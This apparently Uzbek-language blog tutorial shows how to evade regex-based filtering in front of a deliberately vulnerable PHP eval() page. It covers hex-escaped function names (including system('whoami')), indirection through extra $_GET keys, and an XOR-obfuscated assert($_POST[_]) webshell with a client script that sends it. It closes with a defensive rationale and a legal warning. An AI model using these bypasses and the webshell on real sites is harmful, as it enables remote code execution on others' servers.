---
toc: true
title: "WAFni yorib kirish ( kiberxavfsizlik )"
description: "Axmoqlar uchun ishlab chiqilgan WAF tizimini chetlab o'tish. Saytlar xavfsizligini turli usullarda yorib kirish..."
keywords: "WAF, linux, xavfsizlik, xaker, xakerlik, kiberxavfsizlik, injection, buzish, zaharlash, shell, dirka"
---

Sarflavhani o'zidayoq ko'pchilikni waf o'zi nima degan savol o'ylantirgan bo'lsa kerak. 

WAF - Web application firewall ya'ni web saytlarni xss, sql injection, cookie poisoning (cookie orqali zaharlash) kabi hujum turlaridan himoya qiladigan ilova hisoblanadi. 
Ushbu ilova orqali siz hattoki teshik tog'oraga aylangan tizimni ham bemalol hujum scriptlarini filtrlash orqali himoya qilishingiz mumkin.

Lekin bu dunyoda xuddi odam immun tizimi kabi mukammal himoya tizimi mavjud emas. Har qanday himoya tizimini yorib o'tishning yo'llari mavjud.

## WAF qanday ishlaydi
WAF oldindan belgilangan filtrlash shartlariga binoan foydalanuvchidan kelayotgan murojaatlar orasidagi ishga tushirish mumkin bo'lgan kodni tozalaydi.

Misol uchun `sayhello` va `system` funsksiyalarini filtrlash. Bunda kritilgan matnda shart uchun qo'shilgan ikkita funksiya nomi bo'lsa xatolik beriladi:
```php

function sayhello( $text ) {
  echo "Salom: $text";
}
if ( ! preg_match('/sayhello|system/', $code ) ) {
	eval( $code );
}else{
	echo 'Ruxsat etilmagan kiritish';
}
```

## Chetlab o'tish

### Birinchi usul
PHPda `string`  o'rgaruvchisini e'lon qilish vaqtida ekranizatsiya qilish mumkin. Soddaroq aytganda biz double quote ya'ni " belgisi orasida berilgan maxsus belgilarni chop etishimiz mumkin. Yangi qator ( \n ), tabulator (\t) kabi maxsus belgilarni ko'pchilik ishlatib ko'rgan bo'lsa ham kerak.

Ular orasida belgilarni o'noltilik sanoq tizimida chop etish usuli ham kiritilgan.
Misol "Salom dunyo!" yozuvi:
```php
echo "\x53\x61\x6c\x6f\x6d\x20\x64\x75\x6e\x79\x6f\x21";
```
Qo'shimcha tarzda esa php ham boshqa ko'plab tillardagi kabi o'zgaruvchilarga asoslangan funksiyalarni qo'llab quvvatlaydi.

Misol buyerda `$test` o'zgaruvchisi qavs belgilangach funskiyaga murojaat qilishga o'tyapti: 
```php
$test = "sayhello";
$test('Toshmat');
```

Demak bizda o'n oltilik sanoq tizimiga asoslanib chop etish va o'zgaruvchini funsksiyaga murojaat qila olishi orqali yuqoridagi himoyani chetlab o'tish imkoni mavjud.

```php
$code = '"\x73\x61\x79\x68\x65\x6c\x6c\x6f"("test");'; //"sayhello"("test");
```

Natija:
```
Salom: test
```

Yoki ikkinchi funskiya uchun murojaat:
```php
$code = '"\x73\x79\x73\x74\x65\x6d"("whoami");'; //"system"("whoami")
```
Natija:
```
sapper
```
### Ikkinchi usul
Ushbu usul uchun endi himoyani yanada kuchaytiramiz va murojaatlarini `$_GET` so'rovi orqali qabul qilamiz.
```php
$code = $_GET['code'];
if ( ! preg_match('/system|exec|[\"\']/', $code ) ) {
	eval( $code );
}else{
	echo 'Ruxsat etilmagan kiritish';
}
```
E'tibor bergan bo'lsangiz endi kodimizda tirnoq yoki qo'shtirnoqlarni ham filtrlash qo'shildi. Endi biz birinchi usuldan foydala olmaymiz. Lekin boshqa bir yo'l ham mavjud. Massiv asosida chetlab o'tish. Kodimizda `$code`  o'rgaruvchisi uchun `$_GET` massivining `code` kalitiga teng qiymatni belgilayapmiz. Lekin massivdagi boshqa kalitlar e'tiborsizligicha qoldirilmoqda.

Demak biz http orqali quyidagi murojaatni amalga oshiramiz.
```
/hole.php?a=sayhello&b=test&code=$_GET[a]($_GET[b]);
```
Bunda `$_GET` massivining `code` elementiga himoyadagi `sayhello` va qo'shtirnoqlar biriktirilmayapti. Uning o'rniga tekshiruvdan tashqarida bo'lgan `a` va `b` elementlarini o'rgaruvchi sifatida belgilash qo'llanilmoqda.

Natija:
```
**Notice**: Use of undefined constant a - assumed 'a' in **hole.php(14) : eval()'d code** on line **1**  
  
**Notice**: Use of undefined constant b - assumed 'b' in **hole.php(14) : eval()'d code** on line **1**  
Salom: test
```
### Uchinchi usul
Keling maydalashib o'tirmaylikda `string` imkoniyatlaridan voz kechaylik. Filtrlashdan qochishni dinamik o'rgaruvchi yaratib `assert` orqali tizimga birlashtirib yuboraylik.

PHP da debugging uchun juda ko'p imkoniyatlar mavjud. Assert ham dasturni tekshirish jarayonida ishlatilib shart bajarilmaganda boshqa bir harakatni amalga oshirish uchun qo'llaniladi.

Misol:
```php
<?php
$a = 1;
assert($a == 1, "O'zgaruvchi birga teng emas");
echo "Birinchi amal bajarildi";
assert($a == 2, "O'zgaruvchi birga teng emas");
echo "Ikkinchi amal bajarildi";
```
Bundan `$a` birinchi amalda rost javobini beradi. Chunki o'zgaruvchi birga teng. Ikkinchi amalda esa xatolik kuzatamiz chunki ikkiga teng emas.
```
Birinchi amal bajarildi
Fatal error: Uncaught AssertionError: O'zgaruvchi birga teng emas in code.php:5
Stack trace:
#0 code.php(5): assert(false, 'O'zgaruvchi bir...')
#1 {main}
  thrown in code.php on line 5
```
Demak biz bu usulda assertning shartni bajarish uchun unga murojaat qilish imkonidan foydalanamiz. 

Xor operatori orqali esa dinamik belgi yaratamiz.

Misol: 
```php
$_POST['_'] = 'sayhello("Toshmat");';
assert($_POST['_']);
```
Natija:
```
Salom: Toshmat  
**Warning**: assert(): Assertion "sayhello("Toshmat");" failed in **test.php** on line **26**
```
*Xatolik chiqishiga sabab sayhello funksiyamizdan qayta rost (true) javobi kelmaganida. Lekin assert funksiyani ishga tushirdi*

Dinamik o'zgaruvchi generatsiya qilish uchun esa phpning XOR operatoridan foydalanamiz. Demak shart shunday belgilanishi kerakki ikkita bizga kerakli bo'lmagan belgining xor natijasidan string uchun belgi chiqarishimiz kerak.

```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```
Yuqoridagi kodda xor sharti orqali dinamik o'zgaruvchi funksiya yaratilib uning argumenti sifatida `$_POST` so'rovidan kelgan `_` kalitiga teng qiymat belgilanmoqda.

Demak sahifaga murojaat qilish:

```
/hole.php?code=$_=(%27%01%27^%27`%27).(%27%13%27^%27`%27).(%27%13%27^%27`%27).(%27%05%27^%27`%27).(%27%12%27^%27`%27).(%27%14%27^%27`%27);$__=%27_%27.(%27%0D%27^%27]%27).(%27%2F%27^%27`%27).(%27%0E%27^%27]%27).(%27%09%27^%27]%27);$___=$$__;$_($___[_]);
```
```php
<?php

$postdata = http_build_query(
    array(
        '_' => 'sayhello("Toshmat");',
    )
);
$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded',
        'content' => $postdata
    )
);

$context  = stream_context_create($opts);

$result = file_get_contents('http://localhost/hole.php?code=$_=(%27%01%27^%27`%27).(%27%13%27^%27`%27).(%27%13%27^%27`%27).(%27%05%27^%27`%27).(%27%12%27^%27`%27).(%27%14%27^%27`%27);$__=%27_%27.(%27%0D%27^%27]%27).(%27%2F%27^%27`%27).(%27%0E%27^%27]%27).(%27%09%27^%27]%27);$___=$$__;$_($___[_]);', false, $context);

echo strip_tags( html_entity_decode( $result ) );
```

Natija: 
```
Notice:  Use of undefined constant _ - assumed '_' in test.php(10) : eval()'d code on line 2
Salom: Toshmat
Warning:  assert(): Assertion "sayhello("Toshmat");" failed in test.php(10) : eval()'d code on line 2
```

## Xulosa

Yuqoridagi uchta usul bu shunchaki sizning kelajakdagi loyihalaringiz himoyasini ta'minlash uchun ko'rsatildi xolos. Sizdan iltimos qilib so'ragan bo'lardimki ushbu o'rgangan bilimlaringizni kimgadir zarar yetkazish maqsadida qo'llamang. 

Bunday harakatlar uchun O'zbekiston Respublikasini Jinoyat kodeksining 278-moddasi 5-bandida ham alohida ogohlantirishlar berilgan.

> Kompyuter sabotaji
> O‘zganing kompyuter uskunasini yoki xizmatda
> foydalaniladigan kompyuter uskunasini qasddan ishdan chiqarish, xuddi
> shuningdek kompyuter tizimini buzish (kompyuter sabotaji) — uch
> yilgacha muayyan huquqdan mahrum qilib, bazaviy hisoblash miqdorining
> uch yuz baravaridan to‘rt yuz baravarigacha miqdorda jarima yoki ikki
> yilgacha ozodlikni cheklash yoxud ikki yilgacha ozodlikdan mahrum
> qilish bilan jazolanadi.
